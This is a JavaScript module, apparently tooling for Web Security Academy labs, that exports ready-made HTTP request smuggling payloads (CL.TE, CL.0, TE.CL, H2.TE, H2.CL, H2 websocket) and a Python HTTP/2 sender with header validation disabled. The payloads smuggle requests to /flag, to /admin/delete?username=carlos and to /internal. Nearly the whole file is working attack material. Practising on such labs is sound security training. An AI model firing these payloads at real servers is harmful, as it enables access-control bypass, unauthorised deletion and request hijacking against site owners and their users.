export const templates = {
    cltePayload: `POST / HTTP/1.1
Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 36

0

GET /flag HTTP/1.1
X-Ignore: XGET / HTTP/1.1
Host: 0ada007003e1c1b78832d43d0020006c.web-security-academy.net

`, cl0Payload: `POST /resources/images/blog.svg HTTP/1.1
Host: 0a1300910335262282d03366007600a5.web-security-academy.net
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: xGET / HTTP/1.1
Host: 0a1300910335262282d03366007600a5.web-security-academy.net

`, teclPayload: `POST / HTTP/1.1
Host: 0a0d00d40336daa38033173400be001a.web-security-academy.net
Transfer-Encoding: chunked
Content-Length: 4

28
GET /flag HTTP/1.1
Content-Length: 23

0

GET / HTTP/1.1

`, h2tePayload: `{
  ":method": "POST",
  ":path": "/x",
  ":authority": "0a0d00d40336daa38033173400be001a.web-security-academy.net",
  ":scheme": "https",
  "Transfer-Encoding": "chunked",
  ":_body": "0\\r\\n\\r\\nGET /x HTTP/1.1\\r\\nHost: 0a0d00d40336daa38033173400be001a.web-security-academy.net\\r\\n\\r\\n"
}`, h2clPayload: `{
  ":method": "POST",
  ":path": "/x",
  ":authority": "0abc004104142dd28012a82000a70034.web-security-academy.net",
  ":scheme": "https",
  "Content-Length": "0",
  ":_body": "GET /x HTTP/1.1\\r\\nHost: 0abc004104142dd28012a82000a70034.web-security-academy.net\\r\\nContent-Length: 5\\r\\n\\r\\nx=1"
}`, h2wsPayload: `{
    ":method": "CONNECT",
    ":path": "/",
    ":authority": "example.com",
    ":protocol": "websocket",
    ":_body": "GET /internal HTTP/1.1\\r\\n\\r\\n"
}`, h2PythonCode: `import socket
import ssl
import sys

import h2.connection

host = "%%%HOST%%%"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, %%%PORT%%%))
ctx = ssl.create_default_context(purpose=ssl.Purpose.SERVER_AUTH)
ctx.options |= ssl.OP_NO_COMPRESSION
ctx.set_alpn_protocols(["h2", "http/1.1"])
s = ctx.wrap_socket(s, server_hostname=host)
c = h2.connection.H2Connection()
c.config.normalize_outbound_headers = False
c.config.validate_outbound_headers = False
c.config.validate_inbound_headers = False
c.initiate_connection()
s.sendall(c.data_to_send())

sid = c.get_next_available_stream_id()
data = """%%%BODY%%%""".replace("\\n", "\\r\\n").encode()

c.send_headers(sid, [
    (":method", "%%%METHOD%%%"), (":path", "%%%PATH%%%"), (":authority", host), (":scheme", "https"),
    %%%HEADER_TUPLES%%%
])
if data:
    c.send_data(sid, data)
c.end_stream(sid)
s.sendall(c.data_to_send())

while True:
    data = s.recv(65535)
    if not data:
        break
    for event in c.receive_data(data):
        print(event)
        if isinstance(event, h2.events.DataReceived):
            print(event.data)
            pass
        elif isinstance(event, ( h2.events.ConnectionTerminated, h2.events.StreamEnded, h2.events.StreamReset)):
            sys.exit(0)
    s.sendall(c.data_to_send())
`
}